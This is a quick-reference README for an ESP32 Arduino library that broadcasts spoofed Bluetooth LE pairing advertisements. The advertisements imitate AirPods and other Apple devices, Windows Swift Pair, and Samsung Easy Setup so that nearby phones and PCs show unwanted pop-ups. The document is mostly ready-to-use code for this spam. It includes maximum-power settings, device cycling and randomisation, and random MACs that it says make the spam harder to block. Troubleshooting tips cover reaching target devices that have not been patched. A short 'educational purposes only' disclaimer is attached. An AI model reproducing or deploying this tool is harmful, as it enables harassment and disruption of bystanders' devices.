# BLESpam Library - Quick Reference

## Installation Quick Start

### Arduino IDE
1. Download ZIP from GitHub
2. Sketch → Include Library → Add .ZIP Library
3. Select the ZIP file

### PlatformIO
Add to `platformio.ini`:
```ini
lib_deps = https://github.com/hirorogo/Bluetooth-LE-Spam-for-micon.git
```

## Hardware Setup

### ESP32 Boards
- ESP32-DevKitC ✅
- ESP32-WROOM ✅
- ESP32-S3 ✅
- ESP32-C3 ✅

### Wiring
- USB cable for programming and power
- Optional: External antenna for longer range

## Basic Usage Pattern

```cpp
#include <BLESpam.h>

BLESpam bleSpam;

void setup() {
    bleSpam.begin("DeviceName");           // Initialize
    bleSpam.setAdvertisingInterval(100);   // Set interval
    bleSpam.setTxPower(3);                 // Set power
    bleSpam.advertiseAppleDevice(AIRPODS_PRO); // Start spam
}

void loop() {
    delay(1000); // Keep running
}
```

## Spam Types

### Apple Devices
```cpp
bleSpam.advertiseAppleDevice(AIRPODS_PRO);
bleSpam.advertiseAppleDevice(BEATS_STUDIO_BUDS);
bleSpam.advertiseAppleDevice(AIRPODS_MAX);
// ... 17 total device types
```

### Windows
```cpp
bleSpam.advertiseWindowsSwiftPair();
```

### Samsung
```cpp
bleSpam.advertiseSamsungEasySetup("Buds");
```

## Configuration Options

### Advertising Interval
```cpp
bleSpam.setAdvertisingInterval(100); // 100ms (faster = more spam)
```
- Range: 20-10240 ms
- Lower = more frequent but higher power consumption
- Recommended: 50-200 ms

### TX Power
```cpp
bleSpam.setTxPower(9); // Maximum power
```
- ESP32 range: -12 to 9 dBm
- Higher = longer range but higher power consumption
- Recommended: 3-6 dBm

### Random MAC
```cpp
bleSpam.setRandomMac(true); // Enable random MAC
```
- true = harder to track
- false = consistent MAC address

## Common Use Cases

### 1. Single Device Spam
```cpp
void setup() {
    bleSpam.begin("ESP32");
    bleSpam.advertiseAppleDevice(AIRPODS_PRO);
}
```

### 2. Cycling Multiple Devices
```cpp
AppleDeviceType devices[] = {AIRPODS_PRO, BEATS_SOLO3, POWERBEATS_PRO};
int currentDevice = 0;

void loop() {
    bleSpam.advertiseAppleDevice(devices[currentDevice]);
    delay(5000);
    bleSpam.stop();
    currentDevice = (currentDevice + 1) % 3;
}
```

### 3. Random Spam
```cpp
void loop() {
    int random = random(0, appleDevicesCount);
    bleSpam.advertiseAppleDevice(appleDevices[random].type);
    delay(random(2000, 5000));
    bleSpam.stop();
}
```

## Troubleshooting

### Issue: "Failed to initialize BLE"
**Solution:** Make sure you're using an ESP32 board, not ESP8266

### Issue: No popups appearing
**Solutions:**
- Move ESP32 closer to target device
- Increase TX power: `bleSpam.setTxPower(9);`
- Check if device has patched the vulnerability
- Try different spam types

### Issue: Compilation errors
**Solutions:**
- Install ESP32 board support in Arduino IDE
- Update to latest ESP32 board package
- Check library is installed correctly

### Issue: High power consumption
**Solutions:**
- Increase advertising interval: `setAdvertisingInterval(200);`
- Lower TX power: `setTxPower(0);`
- Stop advertising when not needed: `bleSpam.stop();`

## Performance Tips

1. **Balance interval and power:**
   - Fast interval (50-100ms) + high power (6-9 dBm) = maximum spam
   - Slow interval (200ms+) + low power (0-3 dBm) = power saving

2. **Use random MAC:**
   - Harder for devices to block
   - More effective spam

3. **Vary devices:**
   - Cycling through devices is more effective
   - Random patterns work better than fixed sequences

## Legal Warning

⚠️ **IMPORTANT:** This tool is for educational purposes only.

- Always get permission before testing
- Be aware of local laws
- Use responsibly and ethically
- Don't harass or annoy others

## Example Sketches

See the `examples/` folder for:
1. **AppleBLESpam** - Basic Apple device spam
2. **WindowsSwiftPair** - Windows spam
3. **SamsungEasySetup** - Samsung spam
4. **AllDevicesSpam** - Multi-platform spam
5. **RandomAppleSpam** - Advanced random spam

## Resources

- [Full Documentation](README.md)
- [Getting Started Guide](extras/GettingStarted.md)
- [PlatformIO Example](extras/platformio.ini.example)
- [日本語ドキュメント](README_ja.md)

## Support

- GitHub Issues: Report bugs and request features
- GitHub Discussions: Ask questions and share ideas
- Discord: Join the community (see main repository)

---

**Happy (responsible) hacking! 🚀**
